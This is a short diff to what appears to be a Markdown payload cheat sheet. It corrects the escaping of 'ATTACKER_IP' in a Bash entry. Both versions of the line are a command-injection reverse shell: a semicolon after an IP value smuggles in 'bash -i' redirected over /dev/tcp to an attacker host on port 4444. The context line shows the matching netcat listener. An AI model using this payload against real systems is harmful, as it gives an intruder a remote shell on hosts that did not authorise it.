@@ -15,7 +15,7 @@ nc -lvnp 4444
 ## Bash
 
 ```bash
-8.8.8.8;bash -c 'bash -i >\& /dev/tcp/ATTACKER\_IP/4444 0>\&1'
+8.8.8.8;bash -c 'bash -i >\& /dev/tcp/ATTACKER_IP/4444 0>\&1'
 ```
 
 
